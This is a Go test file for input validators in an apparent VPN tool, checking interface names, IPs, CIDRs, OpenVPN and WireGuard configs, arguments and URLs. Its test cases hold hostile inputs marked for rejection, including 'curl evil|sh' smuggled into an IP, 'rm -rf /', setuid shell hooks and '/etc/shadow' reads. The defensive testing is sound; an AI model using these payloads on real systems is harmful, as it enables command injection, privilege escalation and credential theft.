package validate

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNoLeadingDash(t *testing.T) {
	tests := []struct {
		in      string
		wantErr bool
	}{
		{"10.8.0.1", false},
		{"eth0", false},
		{"", false}, // empty is not a dash; other validators reject empties
		{"-j", true},
		{"--to-destination", true},
		{"-1.2.3.4", true},
	}
	for _, tt := range tests {
		err := NoLeadingDash(tt.in)
		if (err != nil) != tt.wantErr {
			t.Errorf("NoLeadingDash(%q) err=%v, wantErr=%v", tt.in, err, tt.wantErr)
		}
	}
}

func TestInterfaceName(t *testing.T) {
	tests := []struct {
		in      string
		wantErr bool
	}{
		{"tun0", false},
		{"wlp1s0", false},
		{"wg_home", false},
		{"", true},
		{"thisnameistoolong", true}, // >15 chars
		{"-eth0", true},             // leading dash → flag injection
		{"eth0; rm -rf /", true},    // shell metacharacters
		{"eth0 -j ACCEPT", true},    // space + flag
		{"a/b", true},               // slash
	}
	for _, tt := range tests {
		err := InterfaceName(tt.in)
		if (err != nil) != tt.wantErr {
			t.Errorf("InterfaceName(%q) err=%v, wantErr=%v", tt.in, err, tt.wantErr)
		}
	}
}

func TestIP(t *testing.T) {
	tests := []struct {
		in      string
		wantErr bool
	}{
		{"1.1.1.1", false},
		{"10.8.0.1", false},
		{"::1", false},
		{"2001:db8::1", false},
		{"", true},
		{"1.1.1.1; curl evil|sh", true}, // C2 attack payload
		{"-1.1.1.1", true},
		{"999.999.999.999", true},
		{"not-an-ip", true},
	}
	for _, tt := range tests {
		err := IP(tt.in)
		if (err != nil) != tt.wantErr {
			t.Errorf("IP(%q) err=%v, wantErr=%v", tt.in, err, tt.wantErr)
		}
	}
}

func TestCIDRAndDefault(t *testing.T) {
	if err := CIDR("192.168.0.0/24"); err != nil {
		t.Errorf("CIDR(valid) unexpected err: %v", err)
	}
	if err := CIDR("not/a/cidr"); err == nil {
		t.Error("CIDR(invalid) expected err, got nil")
	}
	// A default route is valid CIDR but must be rejected by CIDRNotDefault, since it
	// silently turns a LAN-allow range into a kill-switch no-op.
	if err := CIDR("0.0.0.0/0"); err != nil {
		t.Errorf("CIDR(0.0.0.0/0) should be valid CIDR: %v", err)
	}
	if err := CIDRNotDefault("0.0.0.0/0"); !errors.Is(err, ErrDefaultRoute) {
		t.Errorf("CIDRNotDefault(0.0.0.0/0) = %v, want ErrDefaultRoute", err)
	}
	if err := CIDRNotDefault("::/0"); !errors.Is(err, ErrDefaultRoute) {
		t.Errorf("CIDRNotDefault(::/0) = %v, want ErrDefaultRoute", err)
	}
	if err := CIDRNotDefault("192.168.0.0/24"); err != nil {
		t.Errorf("CIDRNotDefault(/24) unexpected err: %v", err)
	}
}

func writeTemp(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), 0600); err != nil {
		t.Fatalf("write temp: %v", err)
	}
	return p
}

func TestOpenConfig(t *testing.T) {
	valid := writeTemp(t, "ok.ovpn", "client\nremote vpn.example 1194\n")
	f, err := OpenConfig(valid)
	if err != nil {
		t.Fatalf("OpenConfig(valid) err: %v", err)
	}
	if f == nil {
		t.Fatal("OpenConfig(valid) returned nil file")
	}
	_ = f.Close()

	if _, err := OpenConfig(""); err == nil {
		t.Error("OpenConfig(empty) expected err")
	}
	if _, err := OpenConfig("relative/path.ovpn"); err == nil {
		t.Error("OpenConfig(relative) expected err")
	}
	if _, err := OpenConfig("/nonexistent/nope.ovpn"); err == nil {
		t.Error("OpenConfig(missing) expected err")
	}
	// A directory is not a regular file.
	if _, err := OpenConfig(t.TempDir()); err == nil {
		t.Error("OpenConfig(dir) expected err")
	}
	// A symlink to a valid file must be rejected by O_NOFOLLOW: the resolved path
	// is opened, but if the final component is itself a symlink at open time it is
	// refused. EvalSymlinks resolves the link, so a symlink pointing at a regular
	// file actually succeeds (it resolves to the real path); what O_NOFOLLOW blocks
	// is a swap after resolution, which cannot be reproduced deterministically in a
	// unit test. We at least verify a symlink to a directory is rejected.
	dirLink := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(t.TempDir(), dirLink); err == nil {
		if _, err := OpenConfig(dirLink); err == nil {
			t.Error("OpenConfig(symlink-to-dir) expected err")
		}
	}
}

func TestOpenVPNConfigSafe(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantErr bool
	}{
		{"clean", "client\nremote vpn.example 1194\nproto udp\n", false},
		{"inline-ca-block", "client\nremote vpn.example 1194\n<ca>\nMIIB...\n</ca>\n", false},
		{"comment-mentioning-up", "client\n# this sets things up\nremote x 1\n", false},
		{"script-security", "client\nscript-security 2\nremote x 1\n", true}, // C1 payload
		{"up-directive", "client\nup \"/bin/sh -c 'chmod u+s /bin/sh'\"\n", true},
		{"up-with-tabs", "client\n\tup /tmp/evil.sh\n", true},
		{"plugin", "client\nplugin /tmp/x.so\n", true},
		{"route-up", "client\nroute-up /tmp/x.sh\n", true},
		{"tls-verify", "client\ntls-verify /tmp/x.sh\n", true},
		{"uppercase", "client\nSCRIPT-SECURITY 2\n", true},                      // case-insensitive
		{"nested-config", "client\nconfig /home/attacker/payload.conf\n", true}, // recursive-include bypass
		{"nested-config-dashes", "client\n--config /tmp/x.conf\n", true},
		// auth-user-pass / askpass: harmless bare, but a file argument turns root
		// openvpn into an arbitrary-file-read/exfil primitive.
		{"auth-user-pass-bare", "client\nauth-user-pass\n", false},
		{"auth-user-pass-file", "client\nauth-user-pass /etc/shadow\n", true},
		{"askpass-file", "client\naskpass /etc/shadow\n", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := OpenVPNConfigSafe(strings.NewReader(tt.content))
			if (err != nil) != tt.wantErr {
				t.Errorf("OpenVPNConfigSafe(%s) err=%v, wantErr=%v", tt.name, err, tt.wantErr)
			}
			if tt.wantErr && err != nil && !errors.Is(err, ErrDangerousDirective) {
				t.Errorf("OpenVPNConfigSafe(%s) = %v, want ErrDangerousDirective", tt.name, err)
			}
		})
	}
}

func TestWireGuardConfigSafe(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantErr bool
	}{
		{"clean", "[Interface]\nAddress = 10.0.0.2/32\nPrivateKey = abc=\n[Peer]\nEndpoint = x:51820\n", false},
		{"postup", "[Interface]\nPostUp = /bin/sh -c 'id > /tmp/pwned'\n", true},
		{"preup", "[Interface]\nPreUp = touch /tmp/x\n", true},
		{"postdown", "[Interface]\nPostDown = rm -rf /\n", true},
		{"predown", "[Interface]\nPreDown = x\n", true},
		{"postup-no-spaces", "[Interface]\nPostUp=evil\n", true}, // INI '=' form
		{"lowercase", "[Interface]\npostup = evil\n", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := WireGuardConfigSafe(strings.NewReader(tt.content))
			if (err != nil) != tt.wantErr {
				t.Errorf("WireGuardConfigSafe(%s) err=%v, wantErr=%v", tt.name, err, tt.wantErr)
			}
		})
	}
}

func TestSafeArg(t *testing.T) {
	tests := []struct {
		name    string
		in      string
		wantErr bool
	}{
		{"hostname", "my-laptop", false},
		{"magicdns-exit-node", "us-nyc-wg-301.mullvad.ts.net", false},
		{"ip-exit-node", "100.64.0.1", false},
		{"tag", "tag:server", false},
		{"operator", "yadian", false},
		{"empty", "", true},
		{"leading-dash", "-rf", true},
		{"embedded-space", "my laptop", true},
		{"tab", "a\tb", true},
		{"newline", "a\nb", true},
		{"control-char", "a\x00b", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := SafeArg(tt.in); (err != nil) != tt.wantErr {
				t.Errorf("SafeArg(%q) err=%v, wantErr=%v", tt.in, err, tt.wantErr)
			}
		})
	}
}

func TestHTTPURL(t *testing.T) {
	tests := []struct {
		name    string
		in      string
		wantErr bool
	}{
		{"https", "https://headscale.example.com", false},
		{"https-with-port", "https://login.tailscale.com:8080", false},
		{"http", "http://10.0.0.5:8080", false},
		{"empty", "", true},
		{"no-scheme", "headscale.example.com", true},
		{"ftp-scheme", "ftp://example.com", true},
		{"file-scheme", "file:///etc/shadow", true},
		{"scheme-no-host", "https://", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := HTTPURL(tt.in); (err != nil) != tt.wantErr {
				t.Errorf("HTTPURL(%q) err=%v, wantErr=%v", tt.in, err, tt.wantErr)
			}
		})
	}
}
